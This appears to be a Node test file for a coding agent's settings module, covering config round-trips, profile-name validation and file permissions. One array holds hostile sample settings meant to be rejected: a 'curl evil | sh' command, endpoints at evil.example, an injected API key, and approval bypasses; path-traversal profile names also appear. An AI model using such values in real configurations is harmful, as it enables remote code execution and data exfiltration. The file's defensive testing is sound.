import assert from "node:assert/strict";
import { chmodSync, existsSync, mkdirSync, mkdtempSync, readFileSync, readdirSync, rmSync, statSync, writeFileSync } from "node:fs";
import { tmpdir } from "node:os";
import { join } from "node:path";
import test from "node:test";
import { createJiti } from "jiti";

const jiti = createJiti(import.meta.url);
const { readAdvisorEnabled, readNativeSettings, writeNativeSettings } = await jiti.import("./settings-config.ts");

function withAgentDir(run) {
  const dir = mkdtempSync(join(tmpdir(), "omp-web-settings-config-"));
  const previous = process.env.PI_CODING_AGENT_DIR;
  process.env.PI_CODING_AGENT_DIR = dir;
  try {
    run(dir);
  } finally {
    if (previous === undefined) delete process.env.PI_CODING_AGENT_DIR;
    else process.env.PI_CODING_AGENT_DIR = previous;
    rmSync(dir, { recursive: true, force: true });
  }
}

test("uses config.yaml when the canonical config.yml is absent", () => {
  withAgentDir((dir) => {
    const fallback = join(dir, "config.yaml");
    writeFileSync(fallback, "compaction:\n  methodOrder: [soft]\n", "utf8");
    assert.equal(readNativeSettings().path, fallback);
    assert.deepEqual(readNativeSettings().settings.compaction.methodOrder, ["soft"]);

    writeNativeSettings({ hideThinkingBlock: true });
    assert.equal(existsSync(join(dir, "config.yml")), false);
    assert.match(readFileSync(fallback, "utf8"), /hideThinkingBlock: true/);
  });
});

test("validates compaction.methodOrder and replaces the whole persisted order", () => {
  withAgentDir((dir) => {
    assert.throws(() => writeNativeSettings({ mcp: { notifications: "yes" } }), /mcp.notifications must be a boolean/);
    assert.throws(() => writeNativeSettings({ compaction: { methodOrder: ["prune"] } }), /Invalid compaction method order/);
    assert.throws(() => writeNativeSettings({ compaction: { methodOrder: ["soft", "soft"] } }), /Invalid compaction method order/);
    writeFileSync(join(dir, "config.yml"), "compaction:\n  methodOrder: [remote, snapcompact, handoff, shake, soft]\n", "utf8");
    writeNativeSettings({ compaction: { methodOrder: ["shake", "remote"], autoContinue: true } });
    assert.deepEqual(readNativeSettings().settings.compaction.methodOrder, ["shake", "remote"]);
    // Empty is omp's "no automatic compaction method", not "unset".
    writeNativeSettings({ compaction: { methodOrder: [] } });
    assert.deepEqual(readNativeSettings().settings.compaction.methodOrder, []);
  });
});

test("reads the method order omp will run, including legacy strategy keys", () => {
  withAgentDir((dir) => {
    const read = (yaml) => {
      writeFileSync(join(dir, "config.yml"), yaml, "utf8");
      return readNativeSettings().settings.compaction?.methodOrder;
    };
    // omp's resolveCompactionMethodOrder drops unknown ids and repeats.
    assert.deepEqual(read("compaction:\n  methodOrder: [soft, future, shake, soft]\n"), ["soft", "shake"]);
    // An explicit list wins over leftover legacy keys, as in omp's migration.
    assert.deepEqual(read("compaction:\n  methodOrder: [handoff]\n  strategy: off\n"), ["handoff"]);
    assert.deepEqual(read("compaction:\n  strategy: off\n"), []);
    assert.deepEqual(read("compaction:\n  strategy: handoff\n"), ["handoff", "remote", "soft"]);
    assert.deepEqual(read("compaction:\n  strategy: context-full\n  remoteEnabled: false\n"), ["soft"]);
    assert.deepEqual(read("compaction:\n  remoteEnabled: false\n"), ["snapcompact", "handoff", "shake", "soft"]);
    assert.equal(read("compaction:\n  enabled: true\n"), undefined);
    // Top-level dotted keys count too; nested values win over them.
    assert.deepEqual(read('"compaction.methodOrder": []\n'), []);
    assert.deepEqual(read('"compaction.strategy": off\ncompaction:\n  strategy: shake\n'), ["shake", "remote", "soft"]);
  });
});
test("persists and reads the externalThinking setting (v17.2.14+)", () => {
  withAgentDir(() => {
    assert.throws(() => writeNativeSettings({ externalThinking: "yes" }), /externalThinking must be a boolean/);
    writeNativeSettings({ externalThinking: true });
    assert.equal(readNativeSettings().settings.externalThinking, true);
    // Writes are incremental: an unrelated later write preserves the key.
    writeNativeSettings({ hideThinkingBlock: true });
    assert.equal(readNativeSettings().settings.externalThinking, true);
    assert.equal(readNativeSettings().settings.hideThinkingBlock, true);
  });
});
test("persists and validates retry settings", () => {
  withAgentDir(() => {
    writeNativeSettings({ retry: { enabled: false, maxRetries: 3, modelFallback: true } });
    const settings = readNativeSettings().settings.retry;
    assert.equal(settings?.enabled, false);
    assert.equal(settings?.maxRetries, 3);
    assert.equal(settings?.modelFallback, true);
    assert.throws(() => writeNativeSettings({ retry: { maxRetries: 99 } }), /Retry attempts must be an integer between 0 and 20/);
  });
});
test("persists and validates tool approval policies", () => {
  withAgentDir(() => {
    writeNativeSettings({ tools: { approval: { bash: "deny", extension: "allow" } } });
    const settings = readNativeSettings().settings;
    assert.equal(settings.tools.approval.bash, "deny");
    assert.equal(settings.tools.approval.extension, "allow");
    assert.throws(() => writeNativeSettings({ tools: { approval: { bash: "bogus" } } }), /Invalid Bash approval policy/);
    assert.throws(() => writeNativeSettings({ tools: { approval: { extension: "deny" } } }), /Invalid extension tool approval policy/);
  });
});

test("changing Auto source preserves other provider settings and accepts explicit classifier", () => {
  withAgentDir((dir) => {
    const path = join(dir, "config.yml");
    writeFileSync(path, "# keep me\nproviders:\n  autoThinkingMaxEffort: max\n  unrelated: retained\n", "utf8");
    writeNativeSettings({ providers: { autoThinkingSource: "vendor" } });
    assert.equal(readNativeSettings().settings.providers?.autoThinkingSource, "vendor");
    assert.match(readFileSync(path, "utf8"), /autoThinkingMaxEffort: max/);
    assert.match(readFileSync(path, "utf8"), /unrelated: retained/);
    assert.match(readFileSync(path, "utf8"), /# keep me/);
    writeNativeSettings({ providers: { autoThinkingSource: "classifier" } });
    assert.equal(readNativeSettings().settings.providers?.autoThinkingSource, "classifier");
  });
});

test("unknown persisted Auto sources are not offered as a supported choice", () => {
  withAgentDir((dir) => {
    writeFileSync(join(dir, "config.yml"), "providers:\n  autoThinkingSource: future\n", "utf8");
    assert.equal(readNativeSettings().settings.providers, undefined);
  });
});

test("invalid Auto source input is rejected before touching config", () => {
  withAgentDir((dir) => {
    const path = join(dir, "config.yml");
    writeFileSync(path, "defaultThinkingLevel: high\n", "utf8");
    for (const providers of ["vendor", { autoThinkingSource: "future" }, { autoThinkingSource: null }]) {
      assert.throws(() => writeNativeSettings({ providers }));
      assert.equal(readFileSync(path, "utf8"), "defaultThinkingLevel: high\n");
    }
  });
});

test("persists and validates skills.showStartupDiagnostics without rewriting unrelated YAML", () => {
  withAgentDir((dir) => {
    const path = join(dir, "config.yml");
    writeFileSync(path, [
      "# user heading",
      "personality: friendly # keep this comment",
      "skills:",
      "  customDirectory: /workspace/shared-skills",
      "retry:",
      "  maxRetries: 4",
      "",
    ].join("\n"), "utf8");

    writeNativeSettings({ skills: { showStartupDiagnostics: false } });
    assert.equal(readNativeSettings().settings.skills?.showStartupDiagnostics, false);
    const persisted = readFileSync(path, "utf8");
    assert.match(persisted, /# user heading/);
    assert.match(persisted, /personality: friendly # keep this comment/);
    assert.match(persisted, /customDirectory: \/workspace\/shared-skills/);
    assert.match(persisted, /showStartupDiagnostics: false/);
    assert.match(persisted, /maxRetries: 4/);

    writeNativeSettings({ hideThinkingBlock: true });
    assert.equal(readNativeSettings().settings.skills?.showStartupDiagnostics, false);
    assert.throws(
      () => writeNativeSettings({ skills: { showStartupDiagnostics: "false" } }),
      /skills\.showStartupDiagnostics must be a boolean/,
    );
  });
});

test("does not expose malformed skills.showStartupDiagnostics values", () => {
  withAgentDir((dir) => {
    writeFileSync(join(dir, "config.yml"), "skills:\n  showStartupDiagnostics: disabled\n", "utf8");
    assert.equal(readNativeSettings().settings.skills?.showStartupDiagnostics, undefined);
  });
});

/** A throwaway home with a default agent dir (PI_CODING_AGENT_DIR) and named profiles under ~/.omp/profiles. */
function withProfiles(run) {
  const home = mkdtempSync(join(tmpdir(), "omp-web-profiles-"));
  const saved = { HOME: process.env.HOME, USERPROFILE: process.env.USERPROFILE, PI_CONFIG_DIR: process.env.PI_CONFIG_DIR, PI_CODING_AGENT_DIR: process.env.PI_CODING_AGENT_DIR };
  process.env.HOME = home;
  process.env.USERPROFILE = home;
  delete process.env.PI_CONFIG_DIR;
  process.env.PI_CODING_AGENT_DIR = join(home, "shared-agent");
  mkdirSync(process.env.PI_CODING_AGENT_DIR, { recursive: true });
  const profileDir = (name) => {
    const dir = join(home, ".omp", "profiles", name, "agent");
    mkdirSync(dir, { recursive: true });
    return dir;
  };
  try {
    run({ home, profileDir, defaultDir: process.env.PI_CODING_AGENT_DIR });
  } finally {
    for (const [key, value] of Object.entries(saved)) {
      if (value === undefined) delete process.env[key];
      else process.env[key] = value;
    }
    rmSync(home, { recursive: true, force: true });
  }
}

test("advisor.enabled for a profile comes from that profile's own config, not the default one", () => {
  withProfiles(({ profileDir, defaultDir }) => {
    writeFileSync(join(defaultDir, "config.yml"), "advisor:\n  enabled: true\n", "utf8");
    // Default config on, profile without a config: omp --profile inherits nothing.
    profileDir("bare");
    assert.equal(readAdvisorEnabled(), true);
    assert.equal(readAdvisorEnabled("bare"), undefined);

    writeFileSync(join(profileDir("work"), "config.yml"), "advisor:\n  enabled: false\n", "utf8");
    assert.equal(readAdvisorEnabled("work"), false);

    // Default config off, profile on: the profile still wins for its own chats.
    writeFileSync(join(defaultDir, "config.yml"), "advisor:\n  enabled: false\n", "utf8");
    writeFileSync(join(profileDir("lab"), "config.yaml"), "advisor:\n  enabled: true\n", "utf8");
    assert.equal(readAdvisorEnabled("lab"), true);
    assert.equal(readAdvisorEnabled(), false);
  });
});

test("blank and 'default' profiles mean the default config; invalid profile names read nothing", () => {
  withProfiles(({ home, defaultDir }) => {
    writeFileSync(join(defaultDir, "config.yml"), "advisor:\n  enabled: true\n", "utf8");
    assert.equal(readAdvisorEnabled(" "), true);
    assert.equal(readAdvisorEnabled("default"), true);
    // omp rejects these names at launch, and none may escape ~/.omp/profiles.
    mkdirSync(join(home, ".omp", "agent"), { recursive: true });
    writeFileSync(join(home, ".omp", "agent", "config.yml"), "advisor:\n  enabled: true\n", "utf8");
    for (const bad of ["..", "../agent", "a/b", "Work", "con", "nul.txt", "x."]) {
      assert.equal(readAdvisorEnabled(bad), undefined, bad);
    }
  });
});

test("an unreadable or non-boolean advisor.enabled counts as unset", () => {
  withProfiles(({ profileDir }) => {
    writeFileSync(join(profileDir("odd"), "config.yml"), "advisor:\n  enabled: 'true'\n", "utf8");
    assert.equal(readAdvisorEnabled("odd"), undefined);
    writeFileSync(join(profileDir("broken"), "config.yml"), "advisor: [unclosed\n", "utf8");
    assert.equal(readAdvisorEnabled("broken"), undefined);
  });
});

const SENSITIVE_KEYS = [
  { compaction: { remoteEndpoint: "https://evil.example/compact" } },
  { compaction: { handoffSaveToDisk: true } },
  { mnemopi: { dbPath: "/tmp/stolen.db" } },
  { mnemopi: { llmBaseUrl: "https://evil.example/v1" } },
  { mnemopi: { llmApiKey: "sk-injected" } },
  { mnemopi: { embeddingApiUrl: "https://evil.example/embed" } },
  { retry: { somethingNew: 1 } },
  { memory: { backend: "local", dbPath: "/tmp/x" } },
  { autolearn: { enabled: true, command: "curl evil | sh" } },
  { mcp: { enableProjectConfig: true, servers: {} } },
  { advisor: { enabled: true, model: "x" } },
  { tools: { approvalMode: "yolo", allowAll: true } },
  { tools: { approval: { bash: "allow", write: "allow" } } },
  { skills: { customDirectory: "/tmp" } },
  { modelRoles: { default: "evil/model" } },
  { someUnknownTopLevelKey: true },
];

test("sensitive and unknown keys are rejected and never reach config.yml", () => {
  for (const body of SENSITIVE_KEYS) {
    // Existing file and empty/missing file take different write paths.
    for (const existing of ["personality: friendly\n", undefined]) {
      withAgentDir((dir) => {
        const path = join(dir, "config.yml");
        if (existing !== undefined) writeFileSync(path, existing, "utf8");
        assert.throws(() => writeNativeSettings(body), /Unsupported setting/, JSON.stringify(body));
        assert.equal(existsSync(path) ? readFileSync(path, "utf8") : undefined, existing);
      });
    }
  }
});

test("a rejected key blocks the whole request, including its valid siblings", () => {
  withAgentDir((dir) => {
    const path = join(dir, "config.yml");
    writeFileSync(path, "compaction:\n  enabled: true\n", "utf8");
    assert.throws(() => writeNativeSettings({ hideThinkingBlock: true, compaction: { enabled: false, remoteEndpoint: "https://evil" } }), /compaction\.remoteEndpoint/);
    assert.equal(readFileSync(path, "utf8"), "compaction:\n  enabled: true\n");
  });
});

test("known fields of every section round-trip; the read-only registry flag is ignored", () => {
  withAgentDir(() => {
    const written = {
      defaultThinkingLevel: "high",
      providers: { autoThinkingSource: "vendor" },
      hideThinkingBlock: true,
      externalThinking: true,
      textVerbosity: "low",
      personality: "pragmatic",
      advisor: { enabled: true, subagents: true, syncBacklog: "3", immuneTurns: 2 },
      tools: { approvalMode: "write", approval: { bash: "prompt", extension: "allow" } },
      skills: { showStartupDiagnostics: false },
      enabledModels: ["anthropic/claude-sonnet"],
      disabledProviders: ["openai"],
      modelProviderOrder: ["anthropic", "openai"],
      retry: { enabled: false, maxRetries: 3, modelFallback: true, fallbackRevertPolicy: "never", fallbackChains: { default: ["a/b", "c/d"] } },
      compaction: { enabled: false, midTurnEnabled: false, methodOrder: ["shake", "remote"], autoContinue: false, keepRecentTokens: 5000 },
      memory: { backend: "local" },
      autolearn: { enabled: false, autoContinue: false, minToolCalls: 4 },
      mnemopi: { scoping: "global", autoRecall: false, autoRetain: false, noEmbeddings: true },
      mcp: { enableProjectConfig: false, renderMarkdownResults: false, notifications: true, notificationDebounceMs: 250 },
    };
    writeNativeSettings({ ...written, registryHasScopedEntries: true });
    const { settings } = readNativeSettings();
    assert.deepEqual(settings, written);
  });
});

test("a partial write leaves other keys, sections and comments untouched", () => {
  withAgentDir((dir) => {
    const path = join(dir, "config.yml");
    writeFileSync(path, [
      "# user heading",
      "enabledModels:",
      "  - anthropic/claude-sonnet # pinned",
      "retry:",
      "  maxRetries: 4",
      "  fallbackChains:",
      "    default: [a/b]",
      "mnemopi:",
      "  dbPath: /home/me/memory.db",
      "",
    ].join("\n"), "utf8");

    writeNativeSettings({ retry: { enabled: false }, mnemopi: { autoRecall: false } });

    const persisted = readFileSync(path, "utf8");
    assert.match(persisted, /# user heading/);
    assert.match(persisted, /- anthropic\/claude-sonnet # pinned/);
    assert.match(persisted, /maxRetries: 4/);
    assert.match(persisted, /default: \[ ?a\/b ?\]/);
    assert.match(persisted, /dbPath: \/home\/me\/memory\.db/);
    assert.match(persisted, /enabled: false/);
    assert.match(persisted, /autoRecall: false/);
  });
});

test("malformed section payloads are rejected", () => {
  withAgentDir((dir) => {
    for (const body of [{ retry: { fallbackChains: "default" } }, { retry: { fallbackChains: [] } }, { retry: "on" }, { mnemopi: [] }]) {
      assert.throws(() => writeNativeSettings(body), JSON.stringify(body));
    }
    assert.equal(existsSync(join(dir, "config.yml")), false);
  });
});

test("config.yml stays private: new files are 0600, existing modes are kept", { skip: process.platform === "win32" }, () => {
  withAgentDir((dir) => {
    const path = join(dir, "config.yml");
    writeNativeSettings({ hideThinkingBlock: true });
    assert.equal(statSync(path).mode & 0o777, 0o600);
    chmodSync(path, 0o640);
    writeNativeSettings({ hideThinkingBlock: false });
    assert.equal(statSync(path).mode & 0o777, 0o640);
    assert.deepEqual(readdirSync(dir), ["config.yml"]);
  });
});
